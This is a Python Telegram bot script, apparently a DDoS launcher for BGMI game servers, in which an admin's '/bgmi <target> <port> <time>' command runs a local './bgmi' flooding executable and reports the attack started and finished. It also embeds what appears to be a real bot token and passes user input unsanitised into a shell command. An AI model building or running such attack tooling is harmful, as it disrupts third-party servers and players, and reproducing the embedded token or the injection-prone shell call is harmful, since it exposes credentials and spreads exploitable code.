import telebot
import subprocess
import datetime
import os
from keep_alive import keep_alive

# Naya Setup - OJASBGMI
bot = telebot.TeleBot('8636140344:AAEUh1GNRu7vD9Rby_0dEIkz-dIODPxdsKA')
admin_id = ["8116319077"]

keep_alive()

@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.reply_to(message, "❄️ Welcome OJASBGMI! Bot is active.\nUse /help to see commands.")

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, "🚀 OJASBGMI Commands:\n/bgmi <target> <port> <time>\n/myinfo - Check your status")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 4:
            target, port, time = command[1], command[2], command[3]
            bot.reply_to(message, f"⚡ Attack Started on {target}:{port} for {time}s")
            # Yahan hum bgmi executable ko call karte hain
            subprocess.run(f"./bgmi {target} {port} {time} 500", shell=True)
            bot.reply_to(message, "✅ Attack Finished!")
        else:
            bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
    else:
        bot.reply_to(message, "❌ Access Denied! You are not Ojas.")

@bot.message_handler(commands=['myinfo'])
def info(message):
    bot.reply_to(message, f"👤 User: {message.from_user.first_name}\n🆔 ID: {message.chat.id}")

bot.polling(none_stop=True)
